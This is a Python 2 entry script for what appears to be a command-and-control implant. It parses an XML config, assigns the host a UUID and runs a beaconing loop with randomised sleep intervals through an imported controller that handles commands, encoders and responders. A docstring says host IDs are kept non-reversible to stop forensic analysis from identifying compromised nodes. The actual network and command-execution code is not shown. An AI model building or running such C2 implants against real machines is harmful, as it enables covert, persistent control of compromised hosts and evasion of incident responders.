#!/usr/bin/env python

import config
from controller import Controller
import time
from random import randint
import sys
from config_parser import *
import os
from uuid import uuid1

def get_host_id():
    """
    Generates a UUID for the host based off of:
    - MAC
    
    Currently the values are not to be reversable, as to prevent
    forensic analysis from determining which nodes are compromised.
    Instead, it relies upon a command to get basic information and populate
    the C2 database accordingly.
    
    Because this could possibly change in the future, I am implementing as
    a facade.
    """
    return uuid1()
    

def load_config():
    """
     this is where the configuration XML file is parsed.
    """
    
    try:
        # if the config file is provided as the first command line argument, use that. Else find the default value from the config.py file.
        if len(sys.argv) > 1:
            config_filename = sys.argv[1]
        else:
            config_filename = sys.path[0] + os.path.sep + config.DEFAULT_CONFIG_FILE
        config_xml = get_xml(config_filename)
        
        # run the parsers. Nothing returns, they just set the values in config.py.
        parse_nodes(config_xml.find(config.NODES_TAG))
        parse_behaviors(config_xml.find(config.BEHAV_TAG))
        parse_modules(config_xml.find(config.MODULES_TAG))
        
        config.UUID = get_host_id()
        
    except Exception, e:
        print '%s Fatal error parsing XML element - %s' % ( config.PROMPT, e)
        sys.exit()
    
    # if no encoders were parsed, just invert the decoders. Effectively says "use the same encoding for responses as was used for the commands
    # received during the beaconing"
    if len(config.ENCODERS) == 0:
            config.ENCODERS = reversed(config.DECODERS)
    
    # If no responders were parsed use the same nodes that we beacon out to.
    if len(config.RESPONDERS) == 0:
            config.RESPONDERS = config.BEACONS
    
    #return (beacons,commands,decoders,encoders,responders)
    
def calculate_sleep():
    """
    This is used by start_beacon_loop() to calculate how long to sleep.
    This should include any checks related to the behavior of beaconing frequency.
    """

    #cur_time = time.ctime()
    sleep_time = 0

    # random time between the min and max sleep interval.
    sleep_time += randint(config.MIN_SLEEP_INT,config.MAX_SLEEP_INT)
    
    return sleep_time
    

def start_beacon_loop(controller):
    """
    this is the iterative loop that calls the controller to start beaconing.
    This should implement behaviors related to the overall success and failure of a beaconing iteration.
    """
    
    while config.CONTINUE_BEACON:
        
        # Call the controller's beaconing facade, which in turns starts the beaconing iteration.
        controller.beacon(config.NODES)
        # based upon the results of the beaconing iteration, implement behaviors here to do if fail/success
        sleep_int = calculate_sleep()
        print  config.PROMPT + " Sleeping for %d seconds" % (sleep_int)
        time.sleep(sleep_int)
        
    return True
                

def main():
    
    print config.PROMPT + " Starting..."
    load_config()
    
    print config.PROMPT + " Building controller..."
    controller = Controller(config.BEACONS, config.COMMANDS, config.DECODERS, config.ENCODERS, config.RESPONDERS)
    
    print config.PROMPT + " Starting beaconer loop..."
    start_beacon_loop(controller)
    

if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        print config.PROMPT + " Exiting"
        sys.exit()
